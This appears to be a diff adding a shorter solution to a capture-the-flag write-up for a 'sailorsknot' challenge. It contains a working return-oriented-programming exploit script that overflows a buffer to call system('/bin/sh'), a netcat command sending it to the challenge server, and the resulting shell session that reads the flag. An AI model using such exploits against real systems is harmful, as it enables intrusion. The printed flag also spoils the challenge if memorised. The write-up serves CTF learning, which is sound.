@@ -157,3 +157,33 @@ he2021{s41l0r_r0p_f0r_pr0f1t}
 The flag is `he2021{s41l0r_r0p_f0r_pr0f1t}`
 
 I learned a lot here! Thank you for this challenge!
+
+## Easier solution
+
+This is much shorter solution (if you don't overlook the `/bin/sh` string in
+`sailorsknot` binary):
+```python
+import sys
+
+OFFSET = b'A' * 40
+POP_RDI = b'\xbf\x07\x40\x00\x00\x00\x00\x00'
+BIN_SH = b'\xb0\x10\x60\x00\x00\x00\x00\x00'
+CALL_SYSTEM = b'\xcc\x07\x40\x00\x00\x00\x00\x00'
+
+sys.stdout.buffer.write(OFFSET + POP_RDI + BIN_SH + CALL_SYSTEM + b'\x0a')
+```
+
+Execute like this:
+```
+$ (python3 sailorsknot.py; cat) | nc 46.101.107.117 2112                                                           130 ⨯
+Welcome! Please give me your name!
+> Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, nice to meet you!
+id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+ls
+challenge2
+flag
+ynetd
+cat flag
+he2021{s41l0r_r0p_f0r_pr0f1t}
+```
